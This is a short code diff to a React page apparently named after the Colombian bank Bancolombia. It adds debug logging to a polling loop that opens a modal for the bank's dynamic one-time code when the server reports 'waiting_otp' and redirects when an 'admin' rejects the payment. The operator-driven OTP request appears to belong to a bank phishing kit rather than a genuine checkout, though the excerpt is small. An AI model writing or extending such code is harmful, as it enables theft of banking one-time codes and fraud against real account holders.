@@ -30,13 +30,15 @@ export default function BancolombiaCargandoPage() {
         const data = await response.json();
         
         if (data.success) {
-          setStatus(data.status);
+          const newStatus = data.status;
+          console.log('📊 Current status:', newStatus);
+          setStatus(newStatus);
 
-          if (data.status === 'waiting_otp') {
-            // Mostrar modal para ingresar clave dinámica
+          if (newStatus === 'waiting_otp') {
+            console.log('🔔 Opening OTP modal');
             setShowOtpModal(true);
-          } else if (data.status === 'admin_rejected') {
-            // Admin rechazó el pago - Redirigir a carrito con mensaje de error
+          } else if (newStatus === 'admin_rejected') {
+            console.log('❌ Payment rejected, redirecting');
             router.push('/carrito?error=pago_fallido');
           }
         }
